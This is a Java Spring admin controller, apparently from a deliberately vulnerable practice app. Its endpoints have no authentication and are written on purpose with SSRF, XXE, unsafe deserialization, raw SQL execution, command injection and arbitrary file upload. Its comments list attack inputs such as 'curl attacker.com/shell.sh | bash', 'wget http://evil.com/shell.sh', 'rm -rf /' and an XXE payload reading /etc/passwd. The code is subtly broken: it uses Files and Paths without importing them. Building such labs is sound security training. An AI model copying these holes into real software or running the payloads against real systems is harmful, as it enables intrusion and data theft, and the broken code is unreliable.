package com.death.cocktail.controller;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.*;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.beans.factory.annotation.Autowired;

import com.thoughtworks.xstream.XStream;
import com.alibaba.fastjson.JSON;

import java.io.*;
import java.net.*;
import java.util.*;

/**
 * ⚠️ VULNERABLE BY DESIGN - DO NOT USE IN PRODUCTION ⚠️
 *
 * Admin Controller with INTENTIONAL vulnerabilities:
 * - SSRF (Server-Side Request Forgery)
 * - XXE (XML External Entity)
 * - Insecure Deserialization
 * - Command Injection
 * - No Authentication
 */
@RestController
@RequestMapping("/api/admin")
public class AdminController {

    private static final Logger logger = LogManager.getLogger(AdminController.class);

    @Autowired
    private JdbcTemplate jdbcTemplate;

    // VULNERABILITY: No authentication on admin endpoints!

    @GetMapping("/fetch-url")
    public Map<String, Object> fetchUrl(@RequestParam String url) {
        Map<String, Object> response = new HashMap<>();

        // VULNERABILITY: Log4Shell
        logger.info("Fetching URL: " + url);

        // ============================================================
        // VULNERABILITY: Server-Side Request Forgery (SSRF) CWE-918
        // ============================================================
        // No URL validation - can access internal resources
        // Attack: url=http://169.254.169.254/latest/meta-data/ (AWS metadata)
        // Attack: url=http://localhost:8080/api/admin/debug
        // Attack: url=file:///etc/passwd
        // Attack: url=http://internal-service.local/secret
        // ============================================================

        try {
            URL targetUrl = new URL(url);
            HttpURLConnection connection = (HttpURLConnection) targetUrl.openConnection();
            connection.setRequestMethod("GET");
            connection.setConnectTimeout(5000);

            BufferedReader reader = new BufferedReader(
                new InputStreamReader(connection.getInputStream())
            );

            StringBuilder content = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                content.append(line).append("\n");
            }
            reader.close();

            response.put("success", true);
            response.put("url", url);
            response.put("responseCode", connection.getResponseCode());
            response.put("content", content.toString());

        } catch (Exception e) {
            response.put("success", false);
            response.put("error", e.getMessage());
        }

        return response;
    }

    @PostMapping("/webhook")
    public Map<String, Object> webhook(@RequestParam String callbackUrl,
                                        @RequestBody String data) {
        Map<String, Object> response = new HashMap<>();

        // VULNERABILITY: Log4Shell
        logger.info("Webhook callback to: " + callbackUrl);

        // VULNERABILITY: SSRF via webhook callback
        // Attacker controls the callback URL
        try {
            URL url = new URL(callbackUrl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);

            // Sends data to attacker-controlled server
            try (OutputStream os = conn.getOutputStream()) {
                os.write(data.getBytes());
            }

            response.put("success", true);
            response.put("responseCode", conn.getResponseCode());

        } catch (Exception e) {
            response.put("success", false);
            response.put("error", e.getMessage());
        }

        return response;
    }

    @PostMapping("/parse-xml")
    public Map<String, Object> parseXml(@RequestBody String xmlData) {
        Map<String, Object> response = new HashMap<>();

        // VULNERABILITY: Log4Shell
        logger.info("Parsing XML data");

        // ============================================================
        // VULNERABILITY: XXE - XML External Entity (CWE-611)
        // ============================================================
        // XStream without security configuration
        // Attack payload:
        // <?xml version="1.0"?>
        // <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        // <data>&xxe;</data>
        // ============================================================

        try {
            XStream xstream = new XStream(); // No security!
            Object result = xstream.fromXML(xmlData);

            response.put("success", true);
            response.put("parsed", result.toString());

        } catch (Exception e) {
            response.put("success", false);
            response.put("error", e.getMessage());
        }

        return response;
    }

    @PostMapping("/deserialize")
    public Map<String, Object> deserialize(@RequestBody String jsonData) {
        Map<String, Object> response = new HashMap<>();

        // VULNERABILITY: Log4Shell
        logger.info("Deserializing: " + jsonData);

        // ============================================================
        // VULNERABILITY: Insecure Deserialization (CWE-502)
        // ============================================================
        // Using Fastjson with autoType enabled (CVE-2022-25845)
        // Allows arbitrary class instantiation and RCE
        // ============================================================

        try {
            // Fastjson with autoType vulnerability
            Object obj = JSON.parse(jsonData);

            response.put("success", true);
            response.put("type", obj.getClass().getName());
            response.put("data", obj.toString());

        } catch (Exception e) {
            response.put("success", false);
            response.put("error", e.getMessage());
        }

        return response;
    }

    @PostMapping("/deserialize-java")
    public Map<String, Object> deserializeJava(@RequestBody byte[] data) {
        Map<String, Object> response = new HashMap<>();

        logger.info("Deserializing Java object");

        // ============================================================
        // VULNERABILITY: Java Deserialization RCE (CWE-502)
        // ============================================================
        // Direct ObjectInputStream on untrusted data
        // Can execute arbitrary code via gadget chains
        // ============================================================

        try {
            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
            Object obj = ois.readObject();  // RCE!
            ois.close();

            response.put("success", true);
            response.put("type", obj.getClass().getName());

        } catch (Exception e) {
            response.put("success", false);
            response.put("error", e.getMessage());
        }

        return response;
    }

    @GetMapping("/database-query")
    public Map<String, Object> databaseQuery(@RequestParam String query) {
        Map<String, Object> response = new HashMap<>();

        // VULNERABILITY: Log4Shell
        logger.info("Executing query: " + query);

        // ============================================================
        // VULNERABILITY: Direct SQL Execution (CWE-89)
        // ============================================================
        // Literally executes any SQL query!
        // Attack: query=DROP TABLE users; --
        // Attack: query=SELECT * FROM users; INSERT INTO admins...
        // ============================================================

        try {
            List<Map<String, Object>> results = jdbcTemplate.queryForList(query);
            response.put("success", true);
            response.put("query", query);
            response.put("results", results);
            response.put("rowCount", results.size());

        } catch (Exception e) {
            response.put("success", false);
            response.put("query", query);
            response.put("error", e.getMessage());
        }

        return response;
    }

    @PostMapping("/backup")
    public Map<String, Object> createBackup(@RequestParam String backupName) {
        Map<String, Object> response = new HashMap<>();

        // VULNERABILITY: Log4Shell
        logger.info("Creating backup: " + backupName);

        // ============================================================
        // VULNERABILITY: Command Injection in Backup (CWE-78)
        // ============================================================
        // Attack: backupName=test; rm -rf /; echo
        // Attack: backupName=$(curl attacker.com/shell.sh | bash)
        // ============================================================

        try {
            String command = "tar -czf /backups/" + backupName + ".tar.gz /app/data";
            Process process = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", command});
            int exitCode = process.waitFor();

            response.put("success", exitCode == 0);
            response.put("command", command);
            response.put("backupFile", "/backups/" + backupName + ".tar.gz");

        } catch (Exception e) {
            response.put("success", false);
            response.put("error", e.getMessage());
        }

        return response;
    }

    @GetMapping("/ping")
    public Map<String, Object> ping(@RequestParam String host) {
        Map<String, Object> response = new HashMap<>();

        // VULNERABILITY: Log4Shell
        logger.info("Pinging host: " + host);

        // ============================================================
        // VULNERABILITY: Command Injection via Ping (CWE-78)
        // ============================================================
        // Attack: host=127.0.0.1; cat /etc/passwd
        // Attack: host=127.0.0.1 && wget http://evil.com/shell.sh
        // ============================================================

        try {
            String command = "ping -c 3 " + host;
            Process process = Runtime.getRuntime().exec(command);

            BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream())
            );

            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }

            response.put("success", true);
            response.put("command", command);
            response.put("output", output.toString());

        } catch (Exception e) {
            response.put("success", false);
            response.put("error", e.getMessage());
        }

        return response;
    }

    @GetMapping("/system-info")
    public Map<String, Object> systemInfo() {
        Map<String, Object> info = new HashMap<>();

        // VULNERABILITY: Information Disclosure
        info.put("os", System.getProperty("os.name"));
        info.put("osVersion", System.getProperty("os.version"));
        info.put("javaVersion", System.getProperty("java.version"));
        info.put("javaHome", System.getProperty("java.home"));
        info.put("userDir", System.getProperty("user.dir"));
        info.put("userName", System.getProperty("user.name"));
        info.put("tempDir", System.getProperty("java.io.tmpdir"));
        info.put("freeMemory", Runtime.getRuntime().freeMemory());
        info.put("totalMemory", Runtime.getRuntime().totalMemory());
        info.put("availableProcessors", Runtime.getRuntime().availableProcessors());

        // VULNERABILITY: Environment variables exposed (may contain secrets)
        info.put("environment", System.getenv());

        return info;
    }

    // VULNERABILITY: Internal endpoint exposed without authentication
    // This simulates VMware vCenter CVE-2021-21972 pattern
    @PostMapping("/internal/vsphere-upload")
    public Map<String, Object> vsphereUpload(@RequestParam("file") String fileContent,
                                              @RequestParam("path") String targetPath) {
        Map<String, Object> response = new HashMap<>();

        // ============================================================
        // VULNERABILITY: Simulates CVE-2021-21972 (CVSS 9.8)
        // ============================================================
        // VMware vCenter unauthenticated file upload to RCE
        // Allows uploading webshell to execute arbitrary code
        // ============================================================

        logger.info("vSphere upload to: " + targetPath);

        try {
            // No authentication check!
            Files.write(Paths.get(targetPath), fileContent.getBytes());

            response.put("success", true);
            response.put("path", targetPath);
            response.put("message", "File uploaded successfully - RCE possible!");

        } catch (Exception e) {
            response.put("success", false);
            response.put("error", e.getMessage());
        }

        return response;
    }
}
